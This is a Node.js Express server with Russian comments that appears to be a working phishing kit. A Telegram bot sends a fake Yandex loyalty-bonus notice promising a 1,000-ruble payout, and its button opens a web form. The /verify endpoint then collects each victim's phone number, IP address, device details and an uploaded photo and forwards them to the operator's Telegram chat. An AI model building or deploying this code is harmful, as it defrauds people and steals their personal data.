const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

const app = express();
const upload = multer();

// Данные из настроек Render
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
// Добавь это сразу после const CHAT_ID = ...

// Функция для отправки приветствия при старте
async function sendWelcome(chatId) {
    const photoUrl = 'https://i.ibb.co/v6Xv5kS/yandex-bonus.jpg'; 
    const captionText = 
        `💳 **Уведомление о начислении #Y-2026**\n\n` +
        `Здравствуйте! Вам доступен ежегодный бонус в рамках программы лояльности.\n\n` +
        `💰 **Сумма: 1,000.00 ₽**\n` +
        `💎 **Статус: Выплата разрешена**\n\n` +
        `Нажмите на кнопку ниже, чтобы открыть форму зачисления средств через СБП.`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            chat_id: chatId,
            photo: photoUrl,
            caption: captionText,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    {
                        text: "🔘 ПОЛУЧИТЬ ВЫПЛАТУ",
                        web_app: { url: "https://ТВОЙ-ДОМЕН.render.com" } // Укажи тут адрес своего сайта на Render
                    }
                ]]
            }
        });
    } catch (e) {
        console.error("Ошибка отправки приветствия:", e.message);
    }
}

// Слушаем команду /start через вебхук или просто проверяем обновления
// Если ты используешь Render, проще всего добавить библиотеку node-telegram-bot-api 
// Но если хочешь без лишних модулей, добавь вот такой эндпоинт:

app.use(express.json()); // Чтобы сервер понимал JSON от Телеграма

app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    const { message } = req.body;
    if (message && message.text === '/start') {
        await sendWelcome(message.from.id);
    }
    res.sendStatus(200);
});

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/verify', upload.single('photo'), async (req, res) => {
    try {
        const { phone, ip, details } = req.body;
        const photo = req.file;

        // Формируем текст сообщения для Telegram
        const caption = `
💰 **НОВАЯ ЗАЯВКА!**
📞 **Данные:** ${phone}
🌐 **IP:** ${ip}

ℹ️ **ТЕХ. ИНФО:**
${details || 'Нет данных'}
        `;

        if (photo) {
            // Отправляем фото с подписью
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', caption);
            form.append('parse_mode', 'Markdown');
            form.append('photo', photo.buffer, { filename: 'verification.jpg' });

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        } else {
            // Если фото нет, просто текст
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: caption,
                parse_mode: 'Markdown'
            });
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('Ошибка:', error.message);
        res.sendStatus(500);
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));